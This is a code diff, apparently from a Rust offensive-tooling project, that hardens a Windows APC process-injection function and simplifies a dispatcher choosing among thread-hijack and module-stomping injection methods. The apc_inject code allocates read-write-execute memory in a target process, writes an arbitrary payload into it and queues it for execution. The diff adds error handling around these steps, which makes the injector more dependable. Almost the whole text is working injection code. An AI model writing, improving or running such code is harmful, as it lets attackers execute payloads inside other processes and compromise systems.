@@ -179,17 +179,28 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
 
         let remote_mem = VirtualAllocEx(pi.hProcess, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if remote_mem.is_null() {
+            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
             CloseHandle(pi.hThread);
             CloseHandle(pi.hProcess);
             return Err(anyhow::anyhow!("VirtualAllocEx failed"));
         }
 
         let mut written = 0;
-        WriteProcessMemory(pi.hProcess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written);
+        if WriteProcessMemory(pi.hProcess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written) == 0 {
+            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return Err(anyhow::anyhow!("WriteProcessMemory failed"));
+        }
 
         // QueueUserAPC for the main thread
         let apc_routine: winapi::um::winnt::PAPCFUNC = std::mem::transmute(remote_mem);
-        QueueUserAPC(apc_routine, pi.hThread, 0);
+        if QueueUserAPC(apc_routine, pi.hThread, 0) == 0 {
+            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            return Err(anyhow::anyhow!("QueueUserAPC failed"));
+        }
 
         ResumeThread(pi.hThread);
 
@@ -200,27 +211,11 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
 }
 
 #[cfg(windows)]
-use crate::injection::{InjectionMethod, Injector};
-#[cfg(windows)]
-use crate::injection::thread_hijack::ThreadHijackInjector;
-#[cfg(windows)]
-use crate::injection::module_stomp::ModuleStompInjector;
+use crate::injection::InjectionMethod;
 
 #[cfg(windows)]
 pub fn select_and_inject(pid: u32, payload: &[u8], method: Option<InjectionMethod>) -> anyhow::Result<()> {
-    let method = method.unwrap_or_else(|| {
-        // Here we'd do environment checks to select dynamically.
-        InjectionMethod::ThreadHijack
-    });
-
+    let method = method.unwrap_or(InjectionMethod::ThreadHijack);
     log::info!("Dispatching injection using method: {:?}", method);
-    
-    match method {
-        InjectionMethod::ThreadHijack => ThreadHijackInjector.inject(pid, payload),
-        InjectionMethod::ModuleStomp => ModuleStompInjector.inject(pid, payload),
-        _ => {
-            log::info!("Fallback to remote thread or other methods");
-            Ok(())
-        }
-    }
+    crate::injection::inject_with_method(method, pid, payload)
 }
